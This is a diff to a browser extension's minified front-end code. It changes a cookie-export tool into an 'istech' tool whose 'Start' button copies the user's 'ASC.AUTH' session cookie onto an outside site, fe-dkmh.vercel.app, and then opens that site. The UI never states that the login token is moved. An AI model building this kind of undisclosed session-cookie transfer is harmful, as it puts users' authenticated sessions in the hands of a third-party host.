@@ -6151,17 +6151,23 @@ const dr = Sr,
                             let ASC_AUTH = cookie.value;
                             if (ASC_AUTH) {
                                 chrome.cookies.set({url: 'https://fe-dkmh.vercel.app/', name: 'ASC.AUTH', value: ASC_AUTH});
+                                // chrome.cookies.set({url: 'http://localhost:3000', name: 'ASC.AUTH', value: ASC_AUTH});
                                 (function redirect() {
                                     // Get the active tab
                                     chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
-                                        // Redirect the active tab to a new URL
-                                        chrome.tabs.update(tabs[0].id, { url: "https://fe-dkmh.vercel.app/" });
-                                        // chrome.tabs.update(tabs[0].id, { url: "http://localhost:3000" });
+                                        try {
+                                            chrome.tabs.create({
+                                                url: "https://fe-dkmh.vercel.app/",
+                                                active: !0
+                                            })
+                                        } catch (t) {
+                                            return console.error(t.message), !1
+                                        }
                                     });
                                 })()
                             }
 
-                            Hr.saveAs(l, `${r}_${this.getTime()}.${c}`)
+                            // Hr.saveAs(l, `${r}_${this.getTime()}.${c}`)
                         } else this.error = !0
                     })
                 } catch (t) {
@@ -6229,7 +6235,7 @@ const dr = Sr,
     },
     Cf = {
         class: "container",
-        id: "juno_okyo"
+        id: "istech"
     },
     Bf = {
         class: "row"
@@ -6306,37 +6312,67 @@ const dr = Sr,
     },
     Yf = ["src"];
 function Qf(e, t, r, n, o, s) {
-    return m0(), D0("div", Cf, [oe("div", Bf, [oe("div", Ef, [o.isValidProtocol ? tt("", !0) : (m0(), D0("div", kf, [Af, t0(" Please select a valid website! ")])), oe("div", Hf, [oe("div", Sf, [t0(" Cookies for "), oe("strong", null, X0(o.sitename), 1), o.fullpage ? tt("", !0) : (m0(), D0("a", {
-        key: 0,
-        href: "#",
-        onClick: t[0] || (t[0] = (...a) => s.openInNewTab && s.openInNewTab(...a)),
-        class: "text-decoration-none float-end"
-    }, "open in new tab"))]), oe("div", Rf, [oe("form", {
-        action: "#",
-        method: "POST",
-        role: "form",
-        class: "text-center",
-        onSubmit: t[8] || (t[8] = xr((...a) => s.saveOptions && s.saveOptions(...a), ["prevent"]))
-    }, [oe("button", {
-        type: "button",
-        class: y0(["btn btn-primary", {
-            disabled: !o.isValidProtocol
-        }]),
-        disabled: !o.isValidProtocol,
-        onClick: t[6] || (t[6] = xr((...a) => s.exportCookies && s.exportCookies(...a), ["stop", "prevent"]))
-    }, "Export", 10, zf)], 32), o.showToasts ? (m0(), D0("div", {
-        key: 0,
-        class: y0(["alert mt-3", {
-            "alert-success": o.toastsType === "success",
-            "alert-danger": o.toastsType === "danger"
-        }]),
-        role: "alert"
-    }, [Mf, t0(" " + X0(o.toastsContent), 1)], 2)) : tt("", !0), o.error ? (m0(), D0("div", qf, [Uf, t0(" No cookies found. ")])) : tt("", !0)]), Nf])])]), oe("div", $f, [oe("div", Xf, [oe("a", Zf, [oe("img", {
-        src: o.imgUrl,
-        class: "img-fluid rounded",
-        alt: "istech-cookies",
-        loading: "lazy"
-    }, null, 8, Yf)])])])])
+    return m0(), 
+        D0("div", {
+            id: "istech"
+        }, [
+            oe("div", null, [
+                oe("div", null, [
+                    o.isValidProtocol ? tt("", !0) : (m0(), D0("div", kf, [Af, t0(" Please select a valid website! ")])), 
+                    oe("div", Hf, [
+                        oe("div", {
+                            class: "row"
+                        }, [
+                            oe("div", {
+                                class: "col-12 wrapper-logo"
+                            }, [
+                                oe("a", {
+                                    href: "https://www.facebook.com/istechclub",
+                                    target: "_blank",
+                                    class: "background-link",
+                                }, [oe("img", {
+                                    src: o.imgUrl,
+                                    class: "img-fluid rounded background-logo",
+                                    alt: "istech-cookies",
+                                    loading: "lazy"
+                                }, null, 8, Yf)])])]),
+                        oe("div", {
+                            class: "information"
+                        }, [
+                            t0(" Nhấn Start để bắt đầu "), 
+                            // oe("strong", null, X0(o.sitename), 1), 
+                            // o.fullpage ? tt("", !0) : (m0(), D0("a", {
+                            //         key: 0,
+                            //         href: "#",
+                            //         onClick: t[0] || (t[0] = (...a) => s.openInNewTab && s.openInNewTab(...a)),
+                            //         class: "text-decoration-none float-end"
+                            //     }, "open in new tab"))
+                            ]), 
+                        oe("div", Rf, [
+                            oe("form", {
+                                action: "#",
+                                method: "POST",
+                                role: "form",
+                                class: "text-center",
+                                onSubmit: t[8] || (t[8] = xr((...a) => s.saveOptions && s.saveOptions(...a), ["prevent"]))
+                            }, [
+                                oe("button", {
+                                        type: "button",
+                                        class: y0(["button-export", {
+                                            disabled: !o.isValidProtocol
+                                        }]),
+                                        disabled: !o.isValidProtocol,
+                                        onClick: t[6] || (t[6] = xr((...a) => s.exportCookies && s.exportCookies(...a), ["stop", "prevent"]))
+                                }, "Start", 10, zf)], 32), 
+                            o.showToasts ? (m0(), D0("div", {
+                                key: 0,
+                                class: y0(["alert mt-3", {
+                                    "alert-success": o.toastsType === "success",
+                                    "alert-danger": o.toastsType === "danger"
+                                }]),
+                                role: "alert"
+                            }, [Mf, t0(" " + X0(o.toastsContent), 1)], 2)) : tt("", !0), o.error ? (m0(), D0("div", qf, [Uf, t0(" No cookies found. ")])) : tt("", !0)]), Nf])])]), 
+                        ])
 }
 const Gf = yf(wf, [
     ["render", Qf]
